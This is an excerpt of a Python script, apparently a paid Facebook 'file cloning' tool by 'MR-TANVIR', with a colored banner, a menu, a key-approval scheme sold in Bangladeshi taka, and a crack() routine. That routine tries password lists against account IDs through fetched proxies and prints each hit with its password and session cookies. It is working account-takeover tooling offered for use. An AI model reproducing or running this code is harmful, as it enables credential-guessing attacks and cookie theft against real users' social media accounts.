...
princp=[]
try:
	prox= requests.get('https://github.com/CYBER-BD71/Api/blob/main/prox.txt').text
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'TANVIR' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  TANVIR,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/TANVIR.King.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-TANVIR ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • এক নারীতে আসক্ত ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38m CYBER-BD71]   ║\33[1;34m   
╠══[Whatsapp                 • 016 fuck fuck ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 3.6 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	TANVIRj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	TANVIRj('\033[0;97m===============================================')
	TANVIR= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if TANVIR in ['m']:
		public()
	elif TANVIR in ['1']:
		crack_file()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[TANVIR-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#TANVIR-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•TANVIR-Cp] {idf} • {pw}')     
				...
				#TANVIR-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•TANVIR-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " TANVIR,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/TANVIR-King/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m TANVIR King, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+TANVIR+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+TANVIR+''+key1
